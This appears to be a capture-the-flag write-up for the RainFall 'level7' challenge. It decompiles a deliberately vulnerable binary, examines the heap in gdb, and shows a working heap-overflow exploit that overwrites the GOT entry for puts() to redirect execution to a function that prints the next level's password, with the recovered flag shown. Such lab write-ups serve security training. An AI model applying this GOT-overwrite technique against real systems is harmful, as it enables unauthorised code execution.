## Step 1: Static & Dynamic Analysis

```c
080484f4    int32_t m()
080484f4    {
080484f4        return printf("%s - %d\n", &c, time(nullptr));
080484f4    }

08048521    int32_t main(int32_t argc, char** argv, char** envp)
08048521    {
08048521        int32_t* ptr1 = malloc(8);
0804853e        *(uint32_t*)ptr1 = 1;
08048556        ptr1[1] = malloc(8);
08048560        int32_t* ptr2 = malloc(8);
0804856d        *(uint32_t*)ptr2 = 2;
08048585        ptr2[1] = malloc(8);
080485a0        strcpy(ptr1[1], argv[1]);
080485bd        strcpy(ptr2[1], argv[2]);
080485eb        fgets(&c, 0x44, fopen("/home/user/level8/.pass", u"r…"));
080485f7        puts("~~");
08048602        return 0;
08048521    }
```

### Explanation
Here, the binary allocates a first block of `8 bytes`.  
In the first half (size: `4 bytes`), it stores an integer value (`1`), and in the second half, it stores a pointer (size: `4 bytes`) to a second address space, provided by another malloc (`8 bytes`).  
In this second address space, the binary will use `strcpy()` to copy the `argv[1]` parameter without performing any checks for a potential `buffer overflow`.  
The binary performs the exact same operation a second time, but this time it stores `2` as the integer value and uses `strcpy()` on `argv[2]`.  

If we supply more than `8 bytes` as the first and second parameters, we will overwrite the data stored next to them.  

```asm
(gdb) disas main
   ...
   ...
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    $0x0,%eax
   0x08048601 <+224>:   leave  
   0x08048602 <+225>:   ret  
```

```bash
(gdb) b*0x080485f7

(gdb) run "aaaaaaaa" "aaaaaaaa"

(gdb) info proc mappings
process 4420
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
         0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
         0x804a000  0x806b000    0x21000        0x0 [heap]
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

```bash
(gdb) x/32wx 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x61616161      0x61616161
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
0x804a030:      0x00000000      0x00000011      0x61616161      0x61616161
0x804a040:      0x00000061      0x00020fc1      0xfbad240c      0x00000000
0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0xb7fd1980
(gdb)
```

At this point, we can observe that by overflowing our first parameter, we overwrite `0x0804a038`, which is the address pointing to the address space allocated by the last malloc.  
This address space is where `strcpy()` will write `argv[2]`.  

If we overwrite this pointer with the address of the `puts()` entry in the `GOT` and then provide the address of `m()` as the second parameter, the binary will jump to `m()` instead of calling `puts()`.  

```asm
int puts(const char *s);
0x08048400      jmp     dword [puts] ; 0x8049928
0x08048406      push    0x28       ; '(' ; 40
0x0804840b      jmp     section..plt
```

## Step 2: Exploiting the Binary

```bash
level7@RainFall:~$ ./level7 "$(python -c 'print(("A" * 20) + ("\x08\x04\x99\x28"[::-1]))')" "$(python -c 'print(("\x08\x04\x84\xf4"[::-1]))')"
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
level7@RainFall:~$
```